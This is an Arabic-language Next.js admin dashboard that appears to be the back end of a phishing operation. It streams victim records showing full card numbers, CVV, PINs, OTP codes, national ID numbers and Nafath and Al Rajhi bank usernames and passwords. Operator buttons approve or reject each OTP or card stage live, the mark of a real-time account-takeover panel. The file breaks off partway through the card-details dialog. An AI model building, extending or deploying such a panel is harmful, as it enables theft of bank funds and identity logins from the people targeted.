"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  LogOut,
  CreditCard,
  User,
  Car,
  FileText,
  CheckCircle,
  XCircle,
  AlertCircle,
  Clock,
  Calendar,
  Search,
  Shield,
  CreditCardIcon as CardIcon,
  Filter,
  MoreHorizontal,
  Tag,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { format } from "date-fns"
import { Toaster, toast } from "sonner"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle, CardFooter } from "@/components/ui/card"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { auth, db } from "@/lib/firebase"
import { Skeleton } from "@/components/ui/skeleton"
import PhoneDialog from "@/components/phone-info"
import NafazAuthDialog from "@/components/nafaz"
import RajhiAuthDialog from "@/components/rajhi"

interface PaymentData {
  card_number?: string
  cvv?: string
  expiration_date?: string
  full_name?: string
}

interface FormData {
  card_number?: string
  cvv?: string
  expiration_date?: string
  full_name?: string
}

interface Notification {
  id: string
  agreeToTerms?: boolean
  buyer_identity_number?: string
  card_number?: string
  createdDate: string
  customs_code?: string
  cvv?: string
  document_owner_full_name?: string
  expiration_date?: string
  formData?: FormData
  full_name?: string
  insurance_purpose?: string
  owner_identity_number?: string
  pagename?: string
  paymentData?: PaymentData
  paymentStatus?: string
  phone?: string
  phone2?: string
  seller_identity_number?: string
  serial_number?: string
  status?: string
  vehicle_manufacture_number?: string
  documment_owner_full_name?:string
  vehicle_type?: string
  isHidden?: boolean
  pinCode?: string
  otpCardCode?: string
  phoneOtp?: string
  otpCode?: string
  externalUsername?: string
  externalPassword?: string
  nafadUsername?: string
  nafadPassword?: string
  nafaz_pin?: string
  autnAttachment?: string
  requierdAttachment?: string
  operator?: string
  otpPhoneStatus: string
  phoneOtpCode:string
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [searchTerm, setSearchTerm] = useState("")
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | "vehicle" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [activeFilter, setActiveFilter] = useState<string | null>(null)
  const router = useRouter()
  const [showCardDialog, setShowCardDialog] = useState(false)
  const [selectedCardInfo, setSelectedCardInfo] = useState<Notification | null>(null)
  const [showPagenameDialog, setShowPagenameDialog] = useState(false)
  const [uniquePagenames, setUniquePagenames] = useState<string[]>([])
  const [showRajhiDialog, setShowRajhiDialog] = useState(false)
  const [showNafazDialog, setShowNafazDialog] = useState(false)
  const [showPhoneDialog, setPhoneDialog] = useState(false)

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  useEffect(() => {
    if (searchTerm.trim() === "" && !activeFilter) {
      setFilteredNotifications(notifications)
    } else {
      const filtered = notifications.filter((notification) => {
        const matchesSearch =
          searchTerm.trim() === "" ||
          notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.phone?.includes(searchTerm) ||
          notification.card_number?.includes(searchTerm)

        const matchesFilter =
          !activeFilter ||
          (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
          (activeFilter === "approved" && notification.status === "approved") ||
          (activeFilter === "rejected" && notification.status === "rejected") ||
          (activeFilter === "payment" && notification.pagename === "payment") ||
          (activeFilter === "registration" && notification.vehicle_type === "registration")

        return matchesSearch && matchesFilter
      })
      setFilteredNotifications(filtered)
    }
  }, [searchTerm, notifications, activeFilter])

  useEffect(() => {
    // Extract unique pagenames from notifications
    if (notifications.length > 0) {
      const pagenames = notifications
        .map((notification) => notification.pagename)
        .filter((pagename): pagename is string => !!pagename)

      const uniqueNames = Array.from(new Set(pagenames))
      setUniquePagenames(uniqueNames)
    }
  }, [notifications])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => ({ id: doc.id, ...doc.data() }) as any)
          .filter((notification: any) => !notification.isHidden) as Notification[]
        setNotifications(notificationsData)
        setFilteredNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
      setFilteredNotifications([])
      toast.success("تم مسح جميع البيانات بنجاح", {
        position: "top-center",
        duration: 3000,
        icon: <CheckCircle className="h-5 w-5" />,
      })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast.error("حدث خطأ أثناء مسح البيانات", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      const updatedNotifications = notifications.filter((notification) => notification.id !== id)
      setNotifications(updatedNotifications)
      setFilteredNotifications(
        updatedNotifications.filter((notification) => {
          const matchesSearch =
            searchTerm.trim() === "" ||
            notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.phone?.includes(searchTerm) ||
            notification.card_number?.includes(searchTerm)

          const matchesFilter =
            !activeFilter ||
            (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
            (activeFilter === "approved" && notification.status === "approved") ||
            (activeFilter === "rejected" && notification.status === "rejected") ||
            (activeFilter === "payment" && notification.pagename === "payment") ||
            (activeFilter === "registration" && notification.vehicle_type === "registration")

          return matchesSearch && matchesFilter
        }),
      )
      toast.success("تم حذف البيانات بنجاح", {
        position: "top-center",
        duration: 3000,
        icon: <CheckCircle className="h-5 w-5" />,
      })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast.error("حدث خطأ أثناء حذف البيانات", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }
  const handlePhoneOtpApproval= async (state: string, id: string) => {
    const targetPost = doc(db, "pays", id)
    await updateDoc(targetPost, {
      phoneVerificationStatus:state,
      otpStatus: state,
    })
  }

  const handlePassApproval= async (state: string, id: string) => {
    const targetPost = doc(db, "pays", id)
    await updateDoc(targetPost, {
      cardOtpStatus:state,
      otpStatus: state,
    })
  }
  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        status: state,
        paymentStatus: state,
      })

      // Update local state
      const updatedNotifications = notifications.map((notification) =>
        notification.id === id ? { ...notification, status: state } : notification,
      )
      setNotifications(updatedNotifications)
      setFilteredNotifications(
        updatedNotifications.filter((notification) => {
          const matchesSearch =
            searchTerm.trim() === "" ||
            notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.phone?.includes(searchTerm) ||
            notification.card_number?.includes(searchTerm)

          const matchesFilter =
            !activeFilter ||
            (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
            (activeFilter === "approved" && notification.status === "approved") ||
            (activeFilter === "rejected" && notification.status === "rejected") ||
            (activeFilter === "payment" && notification.pagename === "payment") ||
            (activeFilter === "registration" && notification.vehicle_type === "registration")

          return matchesSearch && matchesFilter
        }),
      )

      if (state === "approved") {
        toast.success("تم قبول الطلب بنجاح", {
          position: "top-center",
          duration: 3000,
          icon: <CheckCircle className="h-5 w-5" />,
        })
      } else {
        toast.error("تم رفض الطلب", {
          position: "top-center",
          duration: 3000,
          icon: <XCircle className="h-5 w-5" />,
        })
      }

      closeDialog()
    } catch (error) {
      console.error("Error updating status:", error)
      toast.error("حدث خطأ أثناء تحديث الحالة", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const handleUpdatePagename = async (id: string, newPagename: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        pagename: newPagename,
      })

      // Update local state
      const updatedNotifications = notifications.map((notification) =>
        notification.id === id ? { ...notification, pagename: newPagename } : notification,
      )
      setNotifications(updatedNotifications)
      setFilteredNotifications(
        updatedNotifications.filter((notification) => {
          const matchesSearch =
            searchTerm.trim() === "" ||
            notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.phone?.includes(searchTerm) ||
            notification.card_number?.includes(searchTerm)

          const matchesFilter =
            !activeFilter ||
            (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
            (activeFilter === "approved" && notification.status === "approved") ||
            (activeFilter === "rejected" && notification.status === "rejected") ||
            (activeFilter === "payment" && notification.pagename === "payment") ||
            (activeFilter === "registration" && notification.vehicle_type === "registration")

          return matchesSearch && matchesFilter
        }),
      )

      toast.success("تم تحديث نوع الطلب بنجاح", {
        position: "top-center",
        duration: 3000,
        icon: <CheckCircle className="h-5 w-5" />,
      })
    } catch (error) {
      console.error("Error updating pagename:", error)
      toast.error("حدث خطأ أثناء تحديث نوع الطلب", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast.error("حدث خطأ أثناء تسجيل الخروج", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card" | "vehicle") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const handleCardBadgeClick = (notification: Notification, e: React.MouseEvent) => {
    e.stopPropagation()
    setSelectedCardInfo(notification)
    setShowCardDialog(true)
  }

  const handlePagenameBadgeClick = (notification: Notification, e: React.MouseEvent) => {
    e.stopPropagation()
    setSelectedNotification(notification)
    setShowPagenameDialog(true)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  const getStatusBadge = (paymentStatus?: string) => {
    if (!paymentStatus || paymentStatus === "pending") {
      return (
        <div className="flex items-center gap-1.5">
          <Clock className="h-3.5 w-3.5 text-yellow-500" />
          <span className="text-yellow-600 font-medium">قيد الانتظار</span>
        </div>
      )
    } else if (paymentStatus === "approved") {
      return (
        <div className="flex items-center gap-1.5">
          <CheckCircle className="h-3.5 w-3.5 text-green-500" />
          <span className="text-green-600 font-medium">مقبول</span>
        </div>
      )
    } else {
      return (
        <div className="flex items-center gap-1.5">
          <XCircle className="h-3.5 w-3.5 text-red-500" />
          <span className="text-red-600 font-medium">مرفوض</span>
        </div>
      )
    }
  }

  const getPageType = (pagename?: string, clickable = false, notification?: Notification) => {
    let badge

    switch (pagename) {
      case "payment":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-blue-500 to-blue-600 text-white border-0 shadow-sm ${
              clickable ? "cursor-pointer hover:from-blue-600 hover:to-blue-700" : ""
            }`}
          >
            <CreditCard className="h-3 w-3 mr-1" /> دفع
          </Badge>
        )
        break
      case "home":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-purple-500 to-purple-600 text-white border-0 shadow-sm ${
              clickable ? "cursor-pointer hover:from-purple-600 hover:to-purple-700" : ""
            }`}
          >
            <FileText className="h-3 w-3 mr-1" /> تسجيل
          </Badge>
        )
        break
      case "":
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-green-500 to-green-600 text-white border-0 shadow-sm ${
              clickable ? "cursor-pointer hover:from-green-600 hover:to-green-700" : ""
            }`}
          >
            <Calendar className="h-3 w-3 mr-1" /> الرئيسية
          </Badge>
        )
        break
      default:
        badge = (
          <Badge
            variant="outline"
            className={`bg-gradient-to-r from-green-500 to-green-500 text-white border-0 shadow-sm ${
              clickable ? "cursor-pointer hover:from-gray-600 hover:to-gray-700" : ""
            }`}
          >
            <Tag className="h-3 w-3 mr-1" /> {pagename || "الرئيسية"}
          </Badge>
        )
    }

    if (clickable && notification) {
      return <div onClick={(e) => handlePagenameBadgeClick(notification, e)}>{badge}</div>
    }

    return badge
  }

  const formatCardNumber = (cardNumber?: string) => {
    if (!cardNumber) return "غير محدد"
    // Format as **** **** **** 1234
    const last4 = cardNumber.slice(-4)
    return `**** **** **** ${last4}`
  }

  const applyFilter = (filter: string | null) => {
    setActiveFilter(filter)
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100 dark:from-gray-900 dark:to-gray-800 text-foreground p-8">
        <Card className="shadow-xl border-0 overflow-hidden">
          <CardHeader className="bg-white dark:bg-gray-800 pb-2 border-b">
            <div className="flex justify-between items-center">
              <CardTitle className="text-2xl font-bold bg-gradient-to-r from-primary to-primary/80 text-transparent bg-clip-text">
                لوحة البيانات
              </CardTitle>
              <Skeleton className="h-9 w-32 rounded-md" />
            </div>
          </CardHeader>
          <CardContent className="p-6 bg-white dark:bg-gray-800">
            <div className="space-y-6">
              <div className="flex justify-between">
                <Skeleton className="h-10 w-64 rounded-md" />
                <Skeleton className="h-10 w-32 rounded-md" />
              </div>
              <div className="space-y-4">
                {[1, 2, 3, 4].map((i) => (
                  <div
                    key={i}
                    className="flex items-center justify-between p-4 border border-gray-100 dark:border-gray-700 rounded-lg"
                  >
                    <div className="flex items-center gap-4">
                      <Skeleton className="h-10 w-10 rounded-full" />
                      <div className="space-y-2">
                        <Skeleton className="h-4 w-40" />
                        <Skeleton className="h-3 w-24" />
                      </div>
                    </div>
                    <Skeleton className="h-8 w-24 rounded-md" />
                  </div>
                ))}
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div
      dir="rtl"
      className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100 dark:from-gray-900 dark:to-gray-800 text-foreground p-4 md:p-8"
    >
      <Toaster richColors closeButton position="top-center" />
      <Card className="shadow-xl border-0 overflow-hidden">
        <CardHeader className="bg-white dark:bg-gray-800 pb-2 border-b">
          <div className="flex flex-col sm:flex-row justify-between items-center">
            <CardTitle className="text-2xl font-bold bg-gradient-to-r from-primary to-primary/80 text-transparent bg-clip-text">
              لوحة البيانات
            </CardTitle>
            <div className="flex flex-col sm:flex-row gap-2 mt-4 sm:mt-0">
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="destructive"
                      onClick={handleClearAll}
                      className="gap-2 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 border-0 shadow-md"
                      disabled={notifications.length === 0}
                    >
                      <Trash2 className="h-4 w-4" />
                      مسح الكل
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>مسح جميع البيانات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>

              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="outline"
                      onClick={handleLogout}
                      className="gap-2 border border-gray-200 dark:border-gray-700 shadow-sm"
                    >
                      <LogOut className="h-4 w-4" />
                      تسجيل الخروج
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>تسجيل الخروج من النظام</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
            </div>
          </div>
        </CardHeader>

        <div className="p-4 bg-white dark:bg-gray-800 border-b">
          <div className="flex flex-col md:flex-row gap-4 justify-between">
            <div className="relative w-full md:w-96">
              <Search className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
              <Input
                placeholder="بحث بالاسم أو رقم الهاتف أو رقم البطاقة..."
                className="pr-10 w-full"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </div>

            <div className="flex gap-2 overflow-x-auto pb-2 md:pb-0">
              <Button
                variant={activeFilter === null ? "default" : "outline"}
                size="sm"
                onClick={() => applyFilter(null)}
                className={activeFilter === null ? "bg-primary text-white" : ""}
              >
                الكل
              </Button>
              <Button
                variant={activeFilter === "pending" ? "default" : "outline"}
                size="sm"
                onClick={() => applyFilter("pending")}
                className={activeFilter === "pending" ? "bg-yellow-500 text-white hover:bg-yellow-600" : ""}
              >
                <Clock className="h-3.5 w-3.5 ml-1" />
                قيد الانتظار
              </Button>
              <Button
                variant={activeFilter === "approved" ? "default" : "outline"}
                size="sm"
                onClick={() => applyFilter("approved")}
                className={activeFilter === "approved" ? "bg-green-500 text-white hover:bg-green-600" : ""}
              >
                <CheckCircle className="h-3.5 w-3.5 ml-1" />
                مقبول
              </Button>
              <Button
                variant={activeFilter === "rejected" ? "default" : "outline"}
                size="sm"
                onClick={() => applyFilter("rejected")}
                className={activeFilter === "rejected" ? "bg-red-500 text-white hover:bg-red-600" : ""}
              >
                <XCircle className="h-3.5 w-3.5 ml-1" />
                مرفوض
              </Button>
              <Button
                variant={activeFilter === "payment" ? "default" : "outline"}
                size="sm"
                onClick={() => applyFilter("payment")}
                className={activeFilter === "payment" ? "bg-blue-500 text-white hover:bg-blue-600" : ""}
              >
                <CreditCard className="h-3.5 w-3.5 ml-1" />
                دفع
              </Button>
              <Button
                variant={activeFilter === "registration" ? "default" : "outline"}
                size="sm"
                onClick={() => applyFilter("registration")}
                className={activeFilter === "registration" ? "bg-purple-500 text-white hover:bg-purple-600" : ""}
              >
                <Car className="h-3.5 w-3.5 ml-1" />
                تسجيل
              </Button>
            </div>
          </div>
        </div>

        <CardContent className="p-0 bg-white dark:bg-gray-800">
          {filteredNotifications.length === 0 ? (
            <div className="flex flex-col items-center justify-center py-16">
              <div className="w-24 h-24 rounded-full bg-gray-100 dark:bg-gray-700 flex items-center justify-center mb-4">
                <AlertCircle className="h-12 w-12 text-muted-foreground" />
              </div>
              <h3 className="text-xl font-medium mb-2">لا توجد بيانات</h3>
              <p className="text-muted-foreground max-w-md text-center">
                {searchTerm || activeFilter
                  ? "لا توجد نتائج مطابقة لمعايير البحث. يرجى تعديل معايير البحث أو الفلتر."
                  : "ستظهر البيانات الجديدة هنا عند وصولها"}
              </p>
              {(searchTerm || activeFilter) && (
                <Button
                  variant="outline"
                  className="mt-4"
                  onClick={() => {
                    setSearchTerm("")
                    setActiveFilter(null)
                  }}
                >
                  إعادة ضبط البحث
                </Button>
              )}
            </div>
          ) : (
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow className="bg-muted/30 hover:bg-muted/30">
                    <TableHead className="text-right font-bold">الصفحة الحالية </TableHead>
                    <TableHead className="text-right font-bold">الاسم</TableHead>
                    <TableHead className="text-right font-bold">رقم البطاقة</TableHead>

                    <TableHead className="text-right font-bold">اجراء مطلوب</TableHead>
                    <TableHead className="text-right font-bold">الحالة</TableHead>
                    <TableHead className="text-right font-bold">التاريخ</TableHead>
                    <TableHead className="text-center font-bold">إجراءات</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {filteredNotifications.map((notification) => (
                    <TableRow
                      key={notification.id}
                      className="hover:bg-muted/10 border-b border-gray-100 dark:border-gray-700 relative cursor-pointer"
                    >
                      <TableCell>{getPageType(notification.pagename, true, notification)}</TableCell>
                      <TableCell className="font-medium">
                        <div className="flex items-center gap-2">
                          <div className="w-8 h-8 rounded-full bg-primary/10 flex items-center justify-center">
                            <User className="h-4 w-4 text-primary" />
                          </div>
                          <Badge
                                                          onClick={() => handleInfoClick(notification, "personal")}

                          >{notification.documment_owner_full_name || notification.document_owner_full_name || "غير محدد"}</Badge>
                        </div>
                      </TableCell>
                      <TableCell>
                        <Badge
                          variant="outline"
                          className={`cursor-pointer ${
                            notification.card_number
                              ?notification.pinCode? "bg-green-50 text-green-700": notification.otpCardCode?"bg-blue-200 text-blue-700"                            :"bg-orange-400 text-white":"bg-gradient-to-r from-red-400 to-red-600 text-white"
                          } hover:bg-blue-100 dark:bg-blue-900/30 dark:text-white dark:border-blue-800 dark:hover:bg-blue-900/50`}
                          onClick={(e) => handleCardBadgeClick(notification, e)}
                        >
                          <CardIcon className="h-3.5 w-3.5 mr-1.5 mx-1" />
                          {notification.card_number ? "بيانات البطاقة" : "لا يوجد بطاقة"}
                        </Badge>
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-1.5">
                          {notification?.nafadUsername && (
                            <Badge
                              onClick={(e) => {
                                e.stopPropagation()
                                setSelectedNotification(notification)
                                setShowNafazDialog(true)
                              }}
                              className="bg-green-500 cursor-pointer"
                            >
                              نفاذ
                            </Badge>
                          )}
                          {notification?.externalUsername && (
                            <Badge
                              variant="default"
                              className="cursor-pointer"
                              onClick={(e) => {
                                e.stopPropagation()
                                setSelectedNotification(notification)
                                setShowRajhiDialog(true)
                              }}
                            >
                              راجحي
                            </Badge>
                          )}
                          
                          
                          {notification?.phone && (
                            <Badge
                              variant="secondary"
                              className="cursor-pointer"
                              onClick={(e) => {
                                e.stopPropagation()
                                setSelectedNotification(notification)
alert(notification.phoneOtp)                              }}
                            >
                              {notification?.phone}
                            </Badge>
                          )}
                          {
                            (
notification.phone2 &&   
(
                              <Badge
                              className={
                                `cursor-pointer ${
                                  notification.otpCode ? "bg-pink-500 text-white" : ""
                                }`
                              }
                                onClick={(e) => {
                                  e.stopPropagation()
                                  setSelectedNotification(notification)
                                  setPhoneDialog(true)
                                }}
                                variant="outline"
                              >
                                {notification.phone2 &&  notification.phone2 }
                           </Badge>
                            ))
                            
                            }
                        </div>
                      </TableCell>
                   
                      <TableCell>{getStatusBadge(notification.status)}</TableCell>
                      <TableCell>
                        <div className="flex flex-col">
                          <span className="text-sm font-medium">
                            {format(new Date(notification.createdDate), "yyyy/MM/dd")}
                          </span>
                          <span className="text-xs text-muted-foreground">
                            {format(new Date(notification.createdDate), "HH:mm")}
                          </span>
                        </div>
                      </TableCell>
                      <TableCell>
                        <div className="flex justify-center gap-1">
                          <DropdownMenu>
                            <DropdownMenuTrigger asChild>
                              <Button variant="ghost" size="icon" className="h-8 w-8">
                                <MoreHorizontal className="h-4 w-4" />
                              </Button>
                            </DropdownMenuTrigger>
                            <DropdownMenuContent align="end">
                              <DropdownMenuLabel>خيارات</DropdownMenuLabel>
                              <DropdownMenuSeparator />
                              <DropdownMenuItem
                                onClick={() => handleInfoClick(notification, "personal")}
                                className="gap-2"
                              >
                                <User className="h-4 w-4" />
                                معلومات شخصية
                              </DropdownMenuItem>

                              {(notification.card_number ||
                                (notification.formData && notification.formData.card_number)) && (
                                <DropdownMenuItem
                                  onClick={() => handleInfoClick(notification, "card")}
                                  className="gap-2"
                                >
                                  <CreditCard className="h-4 w-4" />
                                  معلومات البطاقة
                                </DropdownMenuItem>
                              )}

                              {notification.vehicle_type && (
                                <DropdownMenuItem
                                  onClick={() => handleInfoClick(notification, "vehicle")}
                                  className="gap-2"
                                >
                                  <Car className="h-4 w-4" />
                                  معلومات المركبة
                                </DropdownMenuItem>
                              )}

                              <DropdownMenuSeparator />

                              <DropdownMenuItem
                                onClick={() => handleDelete(notification.id)}
                                className="gap-2 text-red-600"
                              >
                                <Trash2 className="h-4 w-4" />
                                حذف
                              </DropdownMenuItem>
                            </DropdownMenuContent>
                          </DropdownMenu>
                        </div>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          )}
        </CardContent>

        <CardFooter className="p-4 bg-white dark:bg-gray-800 border-t flex justify-between items-center">
          <div className="text-sm text-muted-foreground">
            إجمالي البيانات: {notifications.length} | تم عرض: {filteredNotifications.length}
          </div>
          <div className="text-sm">
            {activeFilter && (
              <Badge variant="outline" className="gap-1">
                <Filter className="h-3 w-3" />
                {activeFilter === "pending"
                  ? "قيد الانتظار"
                  : activeFilter === "approved"
                    ? "مقبول"
                    : activeFilter === "rejected"
                      ? "مرفوض"
                      : activeFilter === "payment"
                        ? "دفع"
                        : activeFilter === "registration"
                          ? "تسجيل"
                          : activeFilter}
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-4 w-4 ml-1 hover:bg-transparent"
                  onClick={() => setActiveFilter(null)}
                >
                  <XCircle className="h-3 w-3" />
                </Button>
              </Badge>
            )}
          </div>
        </CardFooter>
      </Card>

      {/* Info Dialog */}
      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl" dir="rtl">
          <DialogHeader className="border-b pb-3">
            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-primary to-primary/80 text-transparent bg-clip-text">
              {selectedInfo === "personal"
                ? "المعلومات الشخصية"
                : selectedInfo === "card"
                  ? "معلومات البطاقة"
                  : "معلومات المركبة"}
            </DialogTitle>
            <DialogDescription>
              {selectedInfo === "personal"
                ? "تفاصيل المعلومات الشخصية للمستخدم"
                : selectedInfo === "card"
                  ? "تفاصيل معلومات البطاقة البنكية"
                  : "تفاصيل معلومات المركبة"}
            </DialogDescription>
          </DialogHeader>

          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-3 py-2">
              <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                <p className="text-sm text-muted-foreground">الاسم الكامل</p>
                <div className="flex items-center gap-2 mt-1">
                  <User className="h-4 w-4 text-primary" />
                  <p className="font-medium text-lg">
                    {selectedNotification.documment_owner_full_name || selectedNotification.document_owner_full_name || "غير محدد"}
                  </p>
                </div>
              </div>

              <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                <p className="text-sm text-muted-foreground">رقم الهوية</p>
                <div className="flex items-center gap-2 mt-1">
                  <Shield className="h-4 w-4 text-primary" />
                  <p className="font-medium text-lg font-mono">
                    {selectedNotification.owner_identity_number ||
                      selectedNotification.buyer_identity_number ||
                      "غير محدد"}
                  </p>
                </div>
              </div>

              <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                <p className="text-sm text-muted-foreground">اجراء</p>
                <div className="flex items-center gap-2 mt-1">
                  <p className="font-medium text-lg font-mono">
                    {selectedNotification.nafadUsername && <Badge>نفاذ</Badge>}
                    {selectedNotification.externalUsername && <Badge variant="default">راجحي</Badge>}
                    {selectedNotification.phone ||
                      selectedNotification.phone2 ||
                      (selectedNotification && (
                        <Badge onClick={() => setPhoneDialog(true)} variant="outline">
                          رمز العاتف
                        </Badge>
                      ))}
                  </p>
                </div>
              </div>

              <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                <p className="text-sm text-muted-foreground">نوع الطلب</p>
                <div className="flex items-center gap-2 mt-1">
                  <p className="font-medium">
                    {selectedNotification.pagename || selectedNotification.insurance_purpose || "غير محدد"}
                  </p>
                </div>
              </div>

              {selectedNotification.serial_number && (
                <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">الرقم التسلسلي</p>
                  <div className="flex items-center gap-2 mt-1">
                    <p className="font-medium font-mono">{selectedNotification.serial_number}</p>
                  </div>
                </div>
              )}
            </div>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <Tabs defaultValue="main" className="w-full">
              <TabsList className="grid w-full grid-cols-2 mb-4">
                <TabsTrigger value="main" className="data-[state=active]:bg-primary data-[state=active]:text-white">
                  البطاقة الرئيسية
                </TabsTrigger>
                <TabsTrigger value="form" className="data-[state=active]:bg-primary data-[state=active]:text-white">
                  بيانات النموذج
                </TabsTrigger>
              </TabsList>
              <TabsContent value="main" className="space-y-3 py-2">
                <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">اسم حامل البطاقة</p>
                  <div className="flex items-center gap-2 mt-1">
                    <User className="h-4 w-4 text-primary" />
                    <p className="font-medium text-lg">
                      {selectedNotification.document_owner_full_name || selectedNotification.full_name || "غير محدد"}
                    </p>
                  </div>
                </div>

                <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">رقم البطاقة</p>
                  <div className="flex items-center gap-2 mt-1">
                    <CreditCard className="h-4 w-4 text-primary" />
                    <p className="font-medium text-lg font-mono">{selectedNotification.card_number || "غير محدد"}</p>
                  </div>
                </div>

                <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">تاريخ الانتهاء</p>
                  <div className="flex items-center gap-2 mt-1">
                    <Calendar className="h-4 w-4 text-primary" />
                    <p className="font-medium text-lg font-mono">
                      {selectedNotification.expiration_date || "غير محدد"}
                    </p>
